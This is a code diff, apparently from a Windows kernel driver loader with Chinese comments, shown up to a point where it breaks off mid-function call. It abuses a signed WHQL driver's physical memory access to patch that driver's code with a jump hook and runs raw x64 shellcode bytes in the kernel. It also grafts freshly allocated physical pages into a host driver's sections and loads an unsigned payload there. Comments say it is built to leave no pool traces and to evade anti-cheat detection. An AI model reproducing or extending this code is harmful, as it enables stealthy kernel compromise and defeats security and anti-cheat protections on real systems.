@@ -33,7 +33,7 @@ struct WhqlPatchSite {
     uint8_t  original[64]; // 备份原始字节
 };
 
-// 在物理内存的 WHQL 驱动代码段范围内扫描 default 特征码
+// 在物理内存的 WHQL 驱动 .text 代码段范围内扫描 default 特征码
 static bool FindWhqlDefaultBranch(
     HANDLE   hDev,
     uint64_t cr3,
@@ -41,11 +41,40 @@ static bool FindWhqlDefaultBranch(
     uint32_t whqlDrvSize,   // 驱动镜像大小
     WhqlPatchSite& site)
 {
-    LOG_INFO("FindWhqlDefaultBranch: scanning WHQL driver 0x%016llX size=0x%X",
-             whqlDrvBase, whqlDrvSize);
+    LOG_INFO("FindWhqlDefaultBranch: locating .text section in WHQL driver 0x%016llX...",
+             whqlDrvBase);
 
-    // 在驱动虚拟地址空间内逐 4KB 页扫描
-    for (uint32_t off = 0; off + 0x1000 <= whqlDrvSize; off += 0x1000) {
+    uint32_t scanStartOff = 0;
+    uint32_t scanEndOff = whqlDrvSize;
+
+    // 解析 PE 节表，强制仅在 .text 代码段内执行特征码扫描
+    uint8_t hdrBuf[0x1000] = {};
+    if (ReadKernelVA(hDev, cr3, whqlDrvBase, hdrBuf, sizeof(hdrBuf))) {
+        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdrBuf;
+        if (pDos->e_magic == IMAGE_DOS_SIGNATURE && pDos->e_lfanew < sizeof(hdrBuf) - sizeof(IMAGE_NT_HEADERS64)) {
+            PIMAGE_NT_HEADERS64 pNt = (PIMAGE_NT_HEADERS64)(hdrBuf + pDos->e_lfanew);
+            if (pNt->Signature == IMAGE_NT_SIGNATURE) {
+                PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+                for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+                    if (_strnicmp((const char*)pSec[i].Name, ".text", 5) == 0) {
+                        scanStartOff = pSec[i].VirtualAddress;
+                        uint32_t secLen = pSec[i].Misc.VirtualSize ? pSec[i].Misc.VirtualSize : pSec[i].SizeOfRawData;
+                        scanEndOff = scanStartOff + secLen;
+                        LOG_INFO("FindWhqlDefaultBranch: restricted scan to .text section only [0x%016llX - 0x%016llX] (size=0x%X)",
+                                 whqlDrvBase + scanStartOff, whqlDrvBase + scanEndOff, secLen);
+                        break;
+                    }
+                }
+            }
+        }
+    }
+
+    if (scanStartOff == 0 && scanEndOff == whqlDrvSize) {
+        LOG_WARN("FindWhqlDefaultBranch: .text section not found in PE header, scanning full image with care");
+    }
+
+    // 在驱动 .text 代码段虚拟地址空间内逐 4KB 页扫描
+    for (uint32_t off = scanStartOff; off + sizeof(WHQL_DEFAULT_SIG) <= scanEndOff; off += 0x1000) {
         uint64_t pageVA = whqlDrvBase + off;
         uint64_t pagePA = 0;
         if (!VirtToPhys(hDev, cr3, pageVA, &pagePA)) continue;
@@ -53,19 +82,20 @@ static bool FindWhqlDefaultBranch(
         uint8_t pageBuf[0x1000] = {};
         if (!WhqlReadPhys(hDev, pagePA, pageBuf, sizeof(pageBuf))) continue;
 
-        for (size_t i = 0; i + sizeof(WHQL_DEFAULT_SIG) < sizeof(pageBuf); i++) {
+        size_t maxBytesInPage = min((size_t)0x1000, (size_t)(scanEndOff - off));
+        for (size_t i = 0; i + sizeof(WHQL_DEFAULT_SIG) <= maxBytesInPage; i++) {
             if (memcmp(pageBuf + i, WHQL_DEFAULT_SIG, sizeof(WHQL_DEFAULT_SIG)) == 0) {
                 site.kernVA  = pageVA + i;
                 site.physAddr = pagePA + i;
                 memcpy(site.original, pageBuf + i,
-                       min(sizeof(site.original), sizeof(pageBuf) - i));
-                LOG_OK("FindWhqlDefaultBranch: found at VA=0x%016llX PA=0x%016llX",
+                       min(sizeof(site.original), maxBytesInPage - i));
+                LOG_OK("FindWhqlDefaultBranch: found in .text at VA=0x%016llX PA=0x%016llX",
                        site.kernVA, site.physAddr);
                 return true;
             }
         }
     }
-    LOG_ERR("FindWhqlDefaultBranch: signature not found");
+    LOG_ERR("FindWhqlDefaultBranch: signature not found in .text section");
     return false;
 }
 
@@ -208,7 +238,7 @@ struct ShellcodeParams {
     uint32_t whqlDrvSize;                 // 0x50 宿主驱动 SizeOfImage → fakeDriverObj.DriverSize
     uint32_t pad0;                        // 0x54 占位对齐
     uint64_t whqlLdrEntryVA;              // 0x58 宿主 KLDR_DATA_TABLE_ENTRY 内核 VA → fakeDriverObj.DriverSection
-    DRV_BOOT_CONFIG bootConfig;           // 0x60 (20 字节) Loader 注入给 DriverEntry 的启动参数
+    DRV_BOOT_CONFIG_CORE bootConfig;      // 0x60 (20 字节) Loader 注入给 DriverEntry 的启动参数
     uint32_t pad1;                        // 0x74 (4 字节) 补齐到 120 字节
 };
 #pragma pack(pop)
@@ -228,25 +258,18 @@ static_assert(sizeof(ShellcodeParams) == 120, "ShellcodeParams size must be exac
 static const uint8_t scBranch2B[] = {
     0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5B, 0x49, 0x83, 0xEB, 0x7D, 0x53, 0x56, 0x57, 0x41, 0x54, 
     0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x49, 0x8B, 0xDB, 0x48, 0x81, 0xEC, 0x48, 0x02, 0x00, 0x00, 
-    0x48, 0x33, 0xC9, 0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x4D, 0x33, 0xC0, 
-    0x44, 0x8B, 0x4B, 0x28, 0xFF, 0x13, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xE6, 0x00, 0x00, 0x00, 0x4C, 
-    0x8B, 0xE0, 0x48, 0x8B, 0x4B, 0x38, 0x8B, 0x43, 0x30, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x8B, 0xD0, 
-    0x45, 0x33, 0xC0, 0xFF, 0x53, 0x08, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xC6, 0x00, 0x00, 0x00, 0x4C, 
-    0x8B, 0xE8, 0x45, 0x33, 0xF6, 0x44, 0x3B, 0x73, 0x30, 0x7D, 0x28, 0x4B, 0x8B, 0x44, 0xF4, 0x30, 
-    0x48, 0xC1, 0xE0, 0x0C, 0x48, 0x83, 0xC8, 0x63, 0x4B, 0x89, 0x44, 0xF5, 0x00, 0x48, 0x8B, 0x43, 
-    0x20, 0x41, 0x8B, 0xCE, 0x48, 0xC1, 0xE1, 0x0C, 0x48, 0x03, 0xC1, 0x0F, 0x01, 0x38, 0x41, 0xFF, 
-    0xC6, 0xEB, 0xD2, 0x49, 0x8B, 0xCD, 0x8B, 0x43, 0x30, 0x48, 0xC1, 0xE0, 0x03, 0x48, 0x8B, 0xD0, 
-    0xFF, 0x53, 0x10, 0x48, 0x8B, 0x73, 0x18, 0x48, 0x8B, 0x7B, 0x20, 0x8B, 0x4B, 0x28, 0xF3, 0xA4, 
-    0x48, 0x8B, 0x7B, 0x20, 0x48, 0xB8, 0x31, 0x30, 0x56, 0x52, 0x44, 0x4B, 0x53, 0x57, 0x48, 0x89, 
-    0x07, 0x48, 0x8B, 0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x8B, 0x43, 0x28, 0x89, 0x47, 0x10, 0x48, 
-    0x8D, 0x7C, 0x24, 0x40, 0x33, 0xC0, 0xB9, 0x2A, 0x00, 0x00, 0x00, 0xF3, 0x48, 0xAB, 0x48, 0x8D, 
-    0x7C, 0x24, 0x40, 0x66, 0xC7, 0x07, 0x04, 0x00, 0x66, 0xC7, 0x47, 0x02, 0x50, 0x01, 0x48, 0x8B, 
-    0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x48, 0x8B, 0x43, 0x48, 0x48, 0x89, 0x47, 0x18, 0x8B, 0x43, 
-    0x50, 0x89, 0x47, 0x20, 0x48, 0x8B, 0x43, 0x58, 0x48, 0x89, 0x47, 0x28, 0x48, 0x8B, 0xCF, 0x48, 
-    0x8D, 0x53, 0x60, 0x48, 0x8B, 0x43, 0x20, 0x4C, 0x63, 0x43, 0x2C, 0x49, 0x03, 0xC0, 0xFF, 0xD0, 
-    0x89, 0x43, 0x34, 0xEB, 0x07, 0xC7, 0x43, 0x34, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x81, 0xC4, 0x48, 
-    0x02, 0x00, 0x00, 0x4C, 0x8B, 0x5B, 0x40, 0x8B, 0x5B, 0x34, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 
-    0x41, 0x5C, 0x5F, 0x5E, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x41, 0xFF, 0xE3
+    0x48, 0x8B, 0x7B, 0x20, 0x8B, 0x4B, 0x30, 0x0F, 0x01, 0x3F, 0x48, 0x81, 0xC7, 0x00, 0x10, 0x00, 
+    0x00, 0xFF, 0xC9, 0x75, 0xF2, 0x48, 0x8B, 0x73, 0x18, 0x48, 0x8B, 0x7B, 0x20, 0x8B, 0x4B, 0x28, 
+    0xF3, 0xA4, 0x48, 0x8B, 0x7B, 0x20, 0x48, 0xB8, 0x31, 0x30, 0x56, 0x52, 0x44, 0x4B, 0x53, 0x57, 
+    0x48, 0x89, 0x07, 0x48, 0x8B, 0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x8B, 0x43, 0x28, 0x89, 0x47, 
+    0x10, 0x48, 0x8D, 0x7C, 0x24, 0x40, 0x33, 0xC0, 0xB9, 0x2A, 0x00, 0x00, 0x00, 0xF3, 0x48, 0xAB, 
+    0x48, 0x8D, 0x7C, 0x24, 0x40, 0x66, 0xC7, 0x07, 0x04, 0x00, 0x66, 0xC7, 0x47, 0x02, 0x50, 0x01, 
+    0x48, 0x8B, 0x43, 0x20, 0x48, 0x89, 0x47, 0x08, 0x48, 0x8B, 0x43, 0x48, 0x48, 0x89, 0x47, 0x18, 
+    0x8B, 0x43, 0x50, 0x89, 0x47, 0x20, 0x48, 0x8B, 0x43, 0x58, 0x48, 0x89, 0x47, 0x28, 0x48, 0x8B, 
+    0xCF, 0x48, 0x8D, 0x53, 0x60, 0x48, 0x8B, 0x43, 0x20, 0x4C, 0x63, 0x43, 0x2C, 0x49, 0x03, 0xC0, 
+    0xFF, 0xD0, 0x89, 0x43, 0x34, 0x48, 0x81, 0xC4, 0x48, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x5B, 0x40, 
+    0x8B, 0x5B, 0x34, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x58, 0x48, 0x8B, 
+    0x7C, 0x24, 0x38, 0x41, 0xFF, 0xE3
 };
 static const size_t scBranch2B_size = sizeof(scBranch2B);
 
@@ -350,10 +373,15 @@ static bool BuildShellcodeParams(const InjectContext& ctx,
     params.whqlDrvBase        = ctx.whqlDrvBase;
     params.whqlDrvSize        = ctx.whqlDrvSize;
     params.whqlLdrEntryVA     = ctx.whqlLdrEntryVA;
-    params.bootConfig         = ctx.bootConfig;
+    params.bootConfig.Magic         = ctx.bootConfig.Magic;
+    params.bootConfig.TransportMode = ctx.bootConfig.TransportMode;
+    params.bootConfig.Port          = ctx.bootConfig.Port;
+    params.bootConfig.Reserved      = ctx.bootConfig.Reserved;
+    params.bootConfig.AuthToken     = ctx.bootConfig.AuthToken;
+    params.bootConfig.Flags         = ctx.bootConfig.Flags;
 
-    LOG_OK("BuildShellcodeParams (Branch 2B): params ready (PtePA=0x%016llX Pages=%u TargetVA=0x%016llX UserVA=0x%016llX RetVA=0x%016llX)",
-           params.firstPtePA, params.pageCount, params.payloadTargetVA, params.userImageVA, params.hookReturnVA);
+    LOG_OK("BuildShellcodeParams (Branch 2B): params ready (PtePA=0x%016llX Pages=%u TargetVA=0x%016llX UserVA=0x%016llX RetVA=0x%016llX LdrEntry=0x%016llX)",
+           params.firstPtePA, params.pageCount, params.payloadTargetVA, params.userImageVA, params.hookReturnVA, params.whqlLdrEntryVA);
     return true;
 }
 
@@ -671,6 +699,22 @@ static inline uint32_t FindHostInternalCave(
 }
 
 // ================================================================
+// 纯游离物理内存分配探针 Shellcode（x64，81 字节）
+// 触发后调用 MmAllocatePagesForMdl(0, 0xFFFFFFFFFF, 0, imageSize)
+// 申请脱离系统虚拟地址池的纯物理页，将返回的 PMDL 存入 params->firstPtePA (偏移 0x38)，
+// 寄存器安全：完整保存并恢复调用者的所有非易失性及易失性寄存器，严格平栈返回
+// ================================================================
+static const uint8_t scAllocMdlProbe[] = {
+    0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5B, 0x49, 0x83, 0xEB, 0x7D, 0x53, 0x56, 0x57, 0x41, 0x54, 
+    0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x49, 0x8B, 0xDB, 0x48, 0x83, 0xEC, 0x28, 0x31, 0xC9, 0x48, 
+    0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC0, 0x44, 0x8B, 0x4B, 0x28, 
+    0xFF, 0x13, 0x48, 0x89, 0x43, 0x38, 0x48, 0x83, 0xC4, 0x28, 0x4C, 0x8B, 0x5B, 0x40, 0x31, 0xDB, 
+    0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x58, 0x48, 0x89, 0xC3, 0x41, 0xFF, 
+    0xE3
+};
+static const size_t scAllocMdlProbe_size = sizeof(scAllocMdlProbe);
+
+// ================================================================
 // AllocKernelMdlViaWhql
 //
 // 纯游离物理页分配原语 (Headless Physical Allocation)：
@@ -678,20 +722,120 @@ static inline uint32_t FindHostInternalCave(
 // 申请脱离系统虚拟地址池（NonPagedPool）的纯净物理内存页，
 // 彻底杜绝在系统大池表 (PoolBigPageTable) 中留下记录，消除源虚拟地址解绑痕迹！
 // ================================================================
-// 分支 2B 说明：
-// 旧方案中在用户态通过频繁调用 WhqlWritePhys 改写 PTE 与写入镜像的
-// AllocKernelMdlViaWhql 与 PteRemapHostDriverHeadless 已全量废除。
-// 分支 2B 全程在内核态由 scBranch2B 闭环完成物理页申请、PTE 映射修改与 rep movsb 直拷，
-// 用户态物理写入次数严格为 0，彻底杜绝宿主驱动调用 ZwMapViewOfSection 触发反作弊特征！
+static bool AllocKernelMdlViaWhql(
+    HANDLE   hDev,
+    uint64_t cr3,
+    uint64_t triggerDrvBase,
+    uint32_t triggerDrvSize,
+    const WhqlPatchSite& site,
+    uint64_t caveVA,
+    uint64_t ntoskrnlBase,
+    uint32_t neededBytes,
+    std::vector<uint64_t>& outPagePAs)
+{
+    outPagePAs.clear();
+    (void)triggerDrvBase;
+    (void)triggerDrvSize;
+    uint64_t pfnMmAlloc = ResolveNtosExport(hDev, cr3, ntoskrnlBase, "MmAllocatePagesForMdl");
+    if (!pfnMmAlloc) {
+        pfnMmAlloc = ResolveNtosExport(hDev, cr3, ntoskrnlBase, "MmAllocatePagesForMdlEx");
+    }
+    if (!pfnMmAlloc) {
+        LOG_ERR("AllocKernelMdlViaWhql: failed to resolve MmAllocatePagesForMdl");
+        return false;
+    }
+
+    ShellcodeParams params = {};
+    params.pfnMmAllocatePagesForMdl = pfnMmAlloc;
+    params.imageSize                = neededBytes;
+    params.hookReturnVA             = site.kernVA + 5;
+    params.status                   = 0;
+
+    ScopedThreadAffinity threadAffinity;
+    uint64_t oldCavePte = 0, cavePtePA = 0;
+    if (!EnsureKernelPageWritable(hDev, cr3, caveVA, &oldCavePte, &cavePtePA)) {
+        LOG_ERR("AllocKernelMdlViaWhql: failed to make cave writable");
+        return false;
+    }
+
+    if (!WriteKernelVA(hDev, cr3, caveVA, &params, sizeof(params))) {
+        LOG_ERR("AllocKernelMdlViaWhql: failed to write params");
+        if (cavePtePA && oldCavePte) RestoreKernelPagePte(hDev, cavePtePA, oldCavePte);
+        return false;
+    }
+
+    uint64_t scEntryVA = caveVA + sizeof(params);
+    if (!WriteKernelVA(hDev, cr3, scEntryVA, scAllocMdlProbe, sizeof(scAllocMdlProbe))) {
+        LOG_ERR("AllocKernelMdlViaWhql: failed to write scAllocMdlProbe");
+        if (cavePtePA && oldCavePte) RestoreKernelPagePte(hDev, cavePtePA, oldCavePte);
+        return false;
+    }
+
+    uint8_t jmpBytes[5] = { 0xE9, 0, 0, 0, 0 };
+    int32_t disp = (int32_t)(scEntryVA - (site.kernVA + 5));
+    memcpy(jmpBytes + 1, &disp, 4);
+    if (!WriteKernelVA(hDev, cr3, site.kernVA, jmpBytes, sizeof(jmpBytes))) {
+        LOG_ERR("AllocKernelMdlViaWhql: hook installation failed");
+        if (cavePtePA && oldCavePte) RestoreKernelPagePte(hDev, cavePtePA, oldCavePte);
+        return false;
+    }
+
+    LOG_INFO("AllocKernelMdlViaWhql: triggering MmAllocatePagesForMdl(0x%X bytes) headless allocation...", neededBytes);
+    uint32_t gle = 0;
+    bool ok = WhqlTrigger(hDev, &gle);
+
+    // 无论成败，立即恢复 WHQL 默认分支与 Code Cave 只读属性
+    WriteKernelVA(hDev, cr3, site.kernVA, site.original, 5);
+    if (cavePtePA && oldCavePte) {
+        RestoreKernelPagePte(hDev, cavePtePA, oldCavePte);
+    }
+
+    if (!ok) {
+        LOG_ERR("AllocKernelMdlViaWhql: WhqlTrigger failed (GLE=%u)", gle);
+        return false;
+    }
+
+    ShellcodeParams retParams = {};
+    if (!ReadKernelVA(hDev, cr3, caveVA, &retParams, sizeof(retParams))) {
+        LOG_ERR("AllocKernelMdlViaWhql: failed to read back params");
+        return false;
+    }
+
+    uint64_t pMdl = retParams.firstPtePA; // 微型探针将 rax 存放至 firstPtePA (偏移 0x38)
+    if (!pMdl) {
+        LOG_ERR("AllocKernelMdlViaWhql: MmAllocatePagesForMdl returned NULL");
+        return false;
+    }
+
+    uint32_t pageCount = (neededBytes + 0xFFF) / 0x1000;
+    std::vector<uint64_t> pfnList(pageCount, 0);
+    // 从 pMdl + 0x30 读取 PFN 数组 (x64 下 MDL 头大小为 0x30，紧随其后为 ULONG_PTR pfnArray[])
+    if (!ReadKernelVA(hDev, cr3, pMdl + 0x30, pfnList.data(), pageCount * sizeof(uint64_t))) {
+        LOG_ERR("AllocKernelMdlViaWhql: failed to read PFN array from pMdl=0x%016llX", pMdl);
+        return false;
+    }
+
+    outPagePAs.resize(pageCount);
+    for (uint32_t i = 0; i < pageCount; i++) {
+        if (pfnList[i] == 0) {
+            LOG_ERR("AllocKernelMdlViaWhql: PFN for page %u is 0!", i);
+            return false;
+        }
+        outPagePAs[i] = pfnList[i] << 12;
+    }
+
+    LOG_OK("AllocKernelMdlViaWhql: successfully allocated %u headless pages (pMdl=0x%016llX, FirstPA=0x%016llX)",
+           pageCount, pMdl, outPagePAs.empty() ? 0 : outPagePAs[0]);
+    return true;
+}
+
 // ================================================================
-// ================================================================
-// InjectPayloadIntoHost (分支 2B: 宿主驱动原位 PTE 缝合与直接搬移准备)
+// InjectPayloadIntoHost (方案 1: 游离物理页缝合与宿主驱动寄生)
 //
-// 彻底废除任何用户态物理写（WhqlWritePhys）与 ZwMapViewOfSection:
-// 1. 纯只读解析宿主 PE 节表，选取 Discardable / INIT 或 .reloc 节区
-// 2. 纯只读遍历页表获取目标节区首个 PTE 物理地址 (firstPtePA)
-// 3. 在用户态对 payload 完成重定位 (ApplyRelocation)
-// 4. 将物理页分配、PTE 缝合、TLB 刷新与镜像直接灌入全部交由内核态 Shellcode 闭环执行！
+// 1. 只读解析宿主 PE 节表，选取 Discardable / INIT 或 .reloc 节区
+// 2. 调用 AllocKernelMdlViaWhql 分配合法游离物理页 (零 BigPool 痕迹)
+// 3. 将合法 PFN 缝合至宿主节区的 PTE 表项 (赋予物理 RAM 支持与 RWX 属性)
+// 4. 重定位 payload 并在内核态 Shellcode 中完成 TLB 刷新与瞬时直拷
 // ================================================================
 static bool InjectPayloadIntoHost(
     HANDLE         hDev,
@@ -702,7 +846,7 @@ static bool InjectPayloadIntoHost(
     const wchar_t* hostDrvName,
     MappedImage&   payloadImg,          // 非 const：写入后更新 KernelBase
     uint64_t&      outPayloadKernVA,    // [out] payload 落点内核 VA
-    uint64_t&      outFirstPtePA,       // [out] 分支 2B: 宿主目标节区起始 PTE 物理地址
+    uint64_t&      outFirstPtePA,       // [out] 宿主目标节区起始 PTE 物理地址
     uint64_t       ntoskrnlBase = 0,
     uint64_t       triggerDrvBase = 0,
     uint32_t       triggerDrvSize = 0,
@@ -711,11 +855,6 @@ static bool InjectPayloadIntoHost(
     uint64_t       pfnDataBase = 0)
 {
     (void)hostLdrEntryVA;
-    (void)ntoskrnlBase;
-    (void)triggerDrvBase;
-    (void)triggerDrvSize;
-    (void)pSite;
-    (void)caveVA;
     (void)pfnDataBase;
     outPayloadKernVA = 0;
     outFirstPtePA    = 0;
@@ -723,7 +862,7 @@ static bool InjectPayloadIntoHost(
     char hostNameA[256] = {};
     WideCharToMultiByte(CP_ACP, 0, hostDrvName, -1, hostNameA, sizeof(hostNameA) - 1, nullptr, nullptr);
 
-    LOG_INFO("InjectPayloadIntoHost (Branch 2B): host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X",
+    LOG_INFO("InjectPayloadIntoHost (Plan 1): host='%ls' Base=0x%016llX OrigSize=0x%X PayloadSize=0x%X",
              hostDrvName, hostDrvBase, hostOrigSize, payloadImg.SizeOfImage);
 
     // --- 0. 读取宿主内存 PE 头（前 0x1000 字节，仅用于只读解析节表） ---
@@ -762,7 +901,7 @@ static bool InjectPayloadIntoHost(
 
         if (isDiscardable && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
             candidateTargetRVA = rva;
-            LOG_OK("InjectPayloadIntoHost (Branch 2B): [Pass 1] selected Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
+            LOG_OK("InjectPayloadIntoHost: [Pass 1] selected Discardable/INIT section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
                    sName, rva, vSz, needRemapBytes);
             break;
         }
@@ -779,7 +918,25 @@ static bool InjectPayloadIntoHost(
 
             if (_strnicmp(sName, ".reloc", 6) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
                 candidateTargetRVA = rva;
-                LOG_OK("InjectPayloadIntoHost (Branch 2B): [Pass 2] selected .reloc section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
+                LOG_OK("InjectPayloadIntoHost: [Pass 2] selected .reloc section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
+                       sName, rva, vSz, needRemapBytes);
+                break;
+            }
+        }
+    }
+
+    // Pass 3: 次选 .rsrc
+    if (candidateTargetRVA == 0) {
+        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+            auto* s = &IMAGE_FIRST_SECTION(nt)[i];
+            char sName[9] = {};
+            memcpy(sName, s->Name, 8);
+            uint32_t rva = s->VirtualAddress;
+            uint32_t vSz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;
+
+            if (_strnicmp(sName, ".rsrc", 5) == 0 && vSz >= needRemapBytes && rva + needRemapBytes <= hostOrigSize) {
+                candidateTargetRVA = rva;
+                LOG_OK("InjectPayloadIntoHost: [Pass 3] selected .rsrc section '%s' RVA=0x%X (vSize=0x%X) (needs 0x%X bytes)",
                        sName, rva, vSz, needRemapBytes);
                 break;
             }
@@ -787,18 +944,56 @@ static bool InjectPayloadIntoHost(
     }
 
     if (candidateTargetRVA == 0) {
-        LOG_ERR("InjectPayloadIntoHost: no suitable INIT or .reloc section >= 0x%X bytes found in host", needRemapBytes);
+        LOG_ERR("InjectPayloadIntoHost: no suitable INIT, .reloc, or .rsrc section >= 0x%X bytes found in '%ls'", needRemapBytes, hostDrvName);
         return false;
     }
 
     uint64_t payloadTargetVA = hostDrvBase + candidateTargetRVA;
 
-    // --- 2. 获取目标节区首个 PTE 物理地址 (只读遍历 CR3，0 次物理写，0 次 ZwMapViewOfSection!) ---
-    uint64_t firstPtePA = 0, oldPte = 0;
-    if (!GetPtePhysAddr(hDev, cr3, payloadTargetVA, &firstPtePA, &oldPte)) {
-        LOG_ERR("InjectPayloadIntoHost: cannot locate PTE PA for target VA=0x%016llX", payloadTargetVA);
+    // --- 2. 纯游离物理页分配 (MmAllocatePagesForMdl) 并逐页缝合至宿主节区 PTE ---
+    if (!pSite || !caveVA || !ntoskrnlBase) {
+        LOG_ERR("InjectPayloadIntoHost: missing site, caveVA or ntoskrnlBase for headless allocation");
         return false;
     }
+
+    std::vector<uint64_t> headlessPAs;
+    if (!AllocKernelMdlViaWhql(hDev, cr3, triggerDrvBase, triggerDrvSize, *pSite, caveVA, ntoskrnlBase, needRemapBytes, headlessPAs)) {
+        LOG_ERR("InjectPayloadIntoHost: AllocKernelMdlViaWhql failed");
+        return false;
+    }
+
+    uint32_t pageCount = (payloadImg.SizeOfImage + 0xFFF) / 0x1000;
+    if (headlessPAs.size() < pageCount) {
+        LOG_ERR("InjectPayloadIntoHost: allocated pages (%zu) < needed pages (%u)", headlessPAs.size(), pageCount);
+        return false;
+    }
+
+    uint64_t firstPtePA = 0, firstOldPte = 0;
+    for (uint32_t p = 0; p < pageCount; p++) {
+        uint64_t curVA = payloadTargetVA + p * 0x1000;
+        uint64_t curPtePA = 0, oldPte = 0;
+        if (!GetPtePhysAddr(hDev, cr3, curVA, &curPtePA, &oldPte)) {
+            LOG_ERR("InjectPayloadIntoHost: cannot locate PTE PA for VA=0x%016llX", curVA);
+            return false;
+        }
+        if (p == 0) {
+            firstPtePA = curPtePA;
+            firstOldPte = oldPte;
+        }
+        uint64_t pagePA = headlessPAs[p];
+        uint64_t newPte = (pagePA & PTE_PFN_MASK) | PTE_PRESENT | PTE_RW | PTE_ACCESSED | PTE_DIRTY | PTE_GLOBAL;
+        if (!WhqlWritePhys(hDev, curPtePA, &newPte, sizeof(newPte))) {
+            LOG_ERR("InjectPayloadIntoHost: WhqlWritePhys failed for PTE @ 0x%016llX", curPtePA);
+            return false;
+        }
+    }
+
+    if (!ArePagesPresent(hDev, cr3, payloadTargetVA, payloadImg.SizeOfImage)) {
+        LOG_ERR("InjectPayloadIntoHost: verification failed, pages not all present");
+        return false;
+    }
+    LOG_OK("InjectPayloadIntoHost: successfully remapped %u headless physical pages into '%ls' (FirstPtePA=0x%016llX)!",
+           pageCount, hostDrvName, firstPtePA);
 
     // --- 3. 对 payload 镜像应用重定位 (目标基址 = payloadTargetVA) ---
     if (!ApplyRelocation(payloadImg, payloadTargetVA)) {
@@ -809,7 +1004,7 @@ static bool InjectPayloadIntoHost(
     outPayloadKernVA = payloadTargetVA;
     outFirstPtePA    = firstPtePA;
 
-    LOG_OK("InjectPayloadIntoHost (Branch 2B): Target VA=0x%016llX (FirstPtePA=0x%016llX). 100%% Zero user-mode physical writes, PTE remap & direct movsb deferred to kernel Shellcode!",
+    LOG_OK("InjectPayloadIntoHost: Target VA=0x%016llX (FirstPtePA=0x%016llX). Headless physical RAM bound & ready!",
            payloadTargetVA, firstPtePA);
     return true;
 }
@@ -939,7 +1134,18 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     // ---- 7. 抹除 PE 头 ----
     ErasePEHeader(img);
 
-    // ---- 8. 锁定用户态展开镜像内存页 ----
+    // ---- 8. 锁定用户态展开镜像内存页 (提升 WorkingSet 配额并触碰预热，阻断 GLE=1453) ----
+    SIZE_T minWs = 0, maxWs = 0;
+    if (GetProcessWorkingSetSize(GetCurrentProcess(), &minWs, &maxWs)) {
+        SIZE_T needed = img.Image.size() + (2 * 1024 * 1024);
+        SetProcessWorkingSetSize(GetCurrentProcess(), minWs + needed, maxWs + needed * 2);
+    }
+    // 强制触碰所有页面触发硬件缺页并实际载入 RAM
+    volatile uint8_t* pTouch = img.Image.data();
+    for (size_t off = 0; off < img.Image.size(); off += 0x1000) {
+        volatile uint8_t dummy = pTouch[off];
+        pTouch[off] = dummy;
+    }
     if (!VirtualLock(img.Image.data(), img.Image.size())) {
         LOG_WARN("LoadDrvWsk: VirtualLock warning GLE=%lu (non-fatal, continuing)", GetLastError());
     }
@@ -976,52 +1182,51 @@ static bool LoadDrvWsk(const wchar_t* drvWskPath,
     };
 
     const wchar_t* chosenHostName = nullptr;
-    uint64_t prefBase = 0;
-    uint32_t prefSize = 0;
-    uint64_t prefLdrVA = 0;
+    uint64_t payloadKernVA = 0; // mswsk 在宿主内部的目标内核 VA
+    uint64_t firstPtePA    = 0; // 目标节区首个 PTE 物理地址
     bool foundPref = false;
 
     for (const wchar_t* cand : candidateHosts) {
         if (!cand || wcslen(cand) == 0 || _wcsicmp(cand, triggerDrvName) == 0) continue;
+        uint64_t candBase = 0;
+        uint32_t candSize = 0;
+        uint64_t candLdrVA = 0;
+        bool foundCand = false;
         if (psLoadedModList != 0) {
-            foundPref = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList, cand, prefBase, prefSize, prefLdrVA);
+            foundCand = FindWhqlModuleInLdr(hDev, cr3, psLoadedModList, cand, candBase, candSize, candLdrVA);
         }
-        if (!foundPref) {
-            foundPref = FindWhqlModuleViaPsapi(cand, prefBase, prefSize);
+        if (!foundCand) {
+            foundCand = FindWhqlModuleViaPsapi(cand, candBase, candSize);
         }
-        if (foundPref) {
-            chosenHostName = cand;
-            LOG_OK("LoadDrvWsk: Selected optimal host driver '%ls' (Base=0x%016llX, OrigSize=0x%X)",
-                   chosenHostName, prefBase, prefSize);
-            break;
+        if (foundCand && candBase != 0) {
+            LOG_INFO("LoadDrvWsk: Evaluating candidate host '%ls' (Base=0x%016llX, OrigSize=0x%X)...", cand, candBase, candSize);
+            uint64_t curTargetVA = 0;
+            uint64_t curPtePA = 0;
+            if (InjectPayloadIntoHost(
+                    hDev, cr3, candBase, candSize, candLdrVA,
+                    cand, img, curTargetVA, curPtePA,
